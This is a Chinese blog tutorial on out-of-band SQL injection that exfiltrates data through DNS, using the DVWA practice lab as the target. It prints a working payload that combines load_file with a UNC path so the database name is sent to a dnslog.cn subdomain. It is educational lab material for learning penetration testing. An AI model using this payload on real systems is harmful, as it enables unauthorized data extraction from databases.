# 原创
：  26-5 SQL 注入攻击 - 利用dnslog带回回显信息范例

# 26-5 SQL 注入攻击 - 利用dnslog带回回显信息范例

这篇文章是属于安全渗透的文章，选错专栏了，平台的机制不允许我再改，只能这样了，要学习python脚本的读者可以直接忽略这篇文章。 很抱歉我问了客服客服也没法解决。。

环境准备：[构建完善的安全渗透测试环境：推荐工具、资源和下载链接_渗透测试靶机下载-CSDN博客](https://blog.csdn.net/weixin_43263566/article/details/129031187)

[26-3 SQL注入攻击 - SQL注入无回显，盲注又被封怎么办？-CSDN博客](https://blog.csdn.net/weixin_43263566/article/details/136631963)

#### 一、例子

**目标：使用 DVWA 的盲注作为靶机，获取数据库信息。**

Payload： 

```
# 3mmd5q.dnslog.cn 是dnslog服务器的二级域名要改成自己的
-1' and if((select load_file(concat('\\\\',(select database()),'.3mmd5q.dnslog.cn\\xx'))),1,0)#
```

这个 payload 旨在利用盲注漏洞来执行 SQL 查询，通过 `load_file` 函数加载数据
